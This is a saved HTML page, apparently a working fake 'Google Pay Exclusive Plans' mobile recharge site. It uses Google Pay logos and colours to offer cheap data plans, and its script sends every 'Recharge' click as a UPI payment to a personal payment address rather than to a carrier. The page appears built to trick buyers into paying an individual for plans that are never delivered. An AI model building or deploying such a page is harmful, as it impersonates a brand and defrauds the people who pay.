<!DOCTYPE html>
<!-- saved from url=(0027)http://localhost/second.php -->
<html lang="en">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Recharge Plans</title>
    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }

      body {
        font-family: Arial, sans-serif;
        background-color: #f9f9f9;
        color: #333;
        display: flex;
        flex-direction: column;
        align-items: center;
      }

      header {
        width: 100%;
        background-color: #4285f4;
        /* Google Pay Blue */
        padding: 20px;
        text-align: center;
      }

      header .logo {
        max-width: 150px;
      }

      h3 {
        margin: 20px 0;
        color: #4285f4;
        /* Google Pay Blue */
        text-align: center;
      }

      .recharge-plans {
        display: flex;
        flex-wrap: wrap;
        justify-content: center;
        gap: 20px;
        width: 100%;
        max-width: 1000px;
      }

      .plan {
        background-color: #fff;
        border: 1px solid #ddd;
        border-radius: 8px;
        box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
        padding: 20px;
        text-align: center;
        width: 250px;
        transition: box-shadow 0.3s ease;
      }

      .plan:hover {
        box-shadow: 0px 8px 12px rgba(0, 0, 0, 0.2);
      }

      .plan p {
        font-size: 16px;
        margin-bottom: 10px;
        color: #333;
      }

      .plan button {
        background-color: #ea4335;
        /* Google Pay Red */
        color: white;
        border: none;
        padding: 10px 20px;
        border-radius: 5px;
        cursor: pointer;
        transition: background-color 0.3s ease;
      }

      .plan button:hover {
        background-color: #d93025;
        /* Darker Red */
      }

      footer {
        margin-top: 40px;
      }

      footer img {
        max-width: 200px;
      }

      @media (max-width: 768px) {
        .plan {
          width: 100%;
          max-width: 400px;
        }
      }
    </style>
  </head>

  <body>
    <!-- Logo Section -->
    <header>
      <img src="./recharge_files/logo.png" alt="Google Pay" class="logo" />
    </header>

    <!-- Recharge Plans List -->
    <section class="recharge-plans">
      <h3>Google Pay Exclusive Plans</h3>

      <!-- Plan 1 -->
      <div class="plan">
        <p>₹149 | 1.5 GB/day | 84 days | Unlimited Voice | SMS: 100/day</p>
        <button onclick="initiateGooglePay(&#39;149&#39;)">Recharge</button>
      </div>

      <!-- Plan 2 -->
      <div class="plan">
        <p>₹199 | 2.0 GB/day | 84 days | Unlimited Voice | SMS: 100/day</p>
        <button onclick="initiateGooglePay(&#39;199&#39;)">Recharge</button>
      </div>

      <!-- Add more plans as needed -->
    </section>

    <!-- Footer -->
    <footer>
      <img
        src="./recharge_files/google_pay_footer.webp"
        alt="Google Pay Footer"
      />
    </footer>

    <!-- JavaScript for UPI Deep Link -->
    <script>
      function initiateGooglePay(amount) {
        // UPI deep link format for Google Pay
        var upiLink =
          `upi://pay?pa=kodala.maulik@ybl&pn=GooglePayRecharge&am=` +
          amount +
          `&cu=INR&tn=MobileRecharge`;

        // Open Google Pay using the deep link
        window.location.href = upiLink;
      }
    </script>
  </body>
</html>
